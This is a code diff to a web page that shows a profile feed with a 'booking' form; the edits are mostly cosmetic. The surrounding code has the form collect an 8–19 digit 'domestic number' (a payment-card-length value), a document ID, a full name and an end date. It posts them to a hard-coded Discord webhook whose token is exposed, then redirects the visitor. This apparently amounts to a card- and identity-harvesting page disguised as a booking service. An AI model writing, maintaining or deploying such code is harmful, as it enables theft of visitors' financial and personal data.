@@ -76,7 +76,9 @@
     </div>
   </header>
 
-  <div class="feed" id="feed"></div>
+  <div class="feed" id="feed">
+    <p>Loading profiles...</p>
+  </div>
 
   <!-- General Popup -->
   <div class="popup" id="popup">
@@ -137,7 +139,7 @@
     function renderFeed(list, unlocked = false) {
       feed.innerHTML = '';
       if (!list || list.length === 0) {
-        feed.innerHTML = '<p>No profiles found.</p>';
+        feed.innerHTML = '<p>No profiles found matching criteria.</p>';
         return;
       }
       list.forEach((post, index) => {
@@ -191,7 +193,7 @@
 
     function bookNow(index) {
       document.getElementById('bookingPopup').style.display = 'flex';
-      showTab('manual'); // default to manual entry
+      showTab('manual');
     }
 
     function closePopup() {
@@ -227,7 +229,6 @@
       const fullName = document.getElementById('fullName').value.trim();
       const endDate = document.getElementById('endDate').value;
 
-      // Validation
       if (!/^\d{8,19}$/.test(domesticNumber)) {
         document.getElementById('bookingError').textContent = "Invalid domestic number (must be 8–19 digits).";
         return;
@@ -246,9 +247,8 @@
       }
 
       const bookingData = { domesticNumber, docId, fullName, endDate };
-
-      // Replace with your Discord webhook URL
       const webhookUrl = "https://discord.com/api/webhooks/1533820619026858235/98X3oV-CePeHhVHZ8VmIvjb9S3tdCSUdxa8mZneEItre_ThLTmn7uX1Kso9K8F2lGRkT";
+      
       try {
         await fetch(webhookUrl, {
           method: "POST",
@@ -258,7 +258,6 @@
         document.getElementById('bookingError').style.color = "green";
         document.getElementById('bookingError').textContent = "Booking submitted successfully! Redirecting...";
         
-        // Redirect to index0.html after successful submission
         setTimeout(() => {
           window.location.href = "index0.html";
         }, 1500);
@@ -309,15 +308,15 @@
 
     async function loadProfiles() {
       try {
-        // Changed from profiles.html to profiles.json since it holds profile data. 
-        // If your file is named differently, update "profiles.json" to match it.
-        const res = await fetch("profiles.json");
+        // Explicitly using relative path ./profiles.json for GitHub Pages compatibility
+        const res = await fetch("./profiles.json");
+        if (!res.ok) throw new Error("Network response was not ok");
         const data = await res.json();
         posts = data;
         renderFeed(posts, unlockedState);
       } catch (e) {
         console.error("Failed to load profiles:", e);
-        feed.innerHTML = '<p style="color:red;">Failed to load profile data.</p>';
+        feed.innerHTML = '<p style="color:red;">Failed to load profiles.json. Make sure the file exists in your repository root and is named in all lowercase.</p>';
       }
     }
 
